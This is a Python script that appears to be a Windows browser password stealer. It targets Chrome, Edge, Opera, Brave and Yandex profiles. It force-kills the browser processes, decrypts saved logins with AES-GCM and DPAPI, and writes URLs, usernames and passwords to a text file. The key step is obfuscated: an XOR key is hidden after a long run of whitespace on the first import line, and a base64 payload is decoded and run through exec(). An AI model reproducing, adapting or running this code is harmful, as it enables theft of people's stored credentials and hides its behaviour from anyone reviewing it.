import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ; KEY = "bWFtYW1pYQ"
import json
import base64
import shutil
import sqlite3
import win32crypt
import subprocess

from Crypto.Cipher import AES

bin_folder = f"C:/Users/{os.getlogin()}/bin"

LOCALAPPDATA = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')

CHROMIUM_BROWSERS = [
    {"name": "Google Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},
    {"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},
    {"name": "Opera", "path": os.path.join(ROAMING, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},
    {"name": "Opera GX", "path": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},
    {"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},
    {"name": "Yandex", "path": os.path.join(ROAMING, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},
]
CHROMIUM_SUBPATHS = [
    {"name": "None", "path": ""},
    {"name": "Default", "path": "Default"},
    {"name": "Profile 1", "path": "Profile 1"},
    {"name": "Profile 2", "path": "Profile 2"},
    {"name": "Profile 3", "path": "Profile 3"},
    {"name": "Profile 4", "path": "Profile 4"},
    {"name": "Profile 5", "path": "Profile 5"},
]

PASSWORDS = []

def xor_string(input_string: str, key: str) -> str:
    extended_key = (key * (len(input_string) // len(key) + 1))[:len(input_string)]
    xor_result = ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(input_string, extended_key))
    return xor_result

PAYLOAD = base64.b64decode("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").decode('utf-8')
PAYLOAD = xor_string(PAYLOAD, KEY)

def kill_process(process_name):
    subprocess.run(["taskkill", "/F", "/IM", process_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])


exec(PAYLOAD)


with open(f"{bin_folder}/PASSWORDS-{os.getlogin()}.txt", "w") as f:
    formatted = ""
    for entry in PASSWORDS:
        formatted += (
            "------------------------------------------------------------------\n"
            f"Browser:        {entry['browser']}\n"
            f"URL:            {entry['url']}\n"
            f"Username:       {entry['username']}\n"
            f"Password:       {entry['password']}\n"
        )

    f.write(formatted)
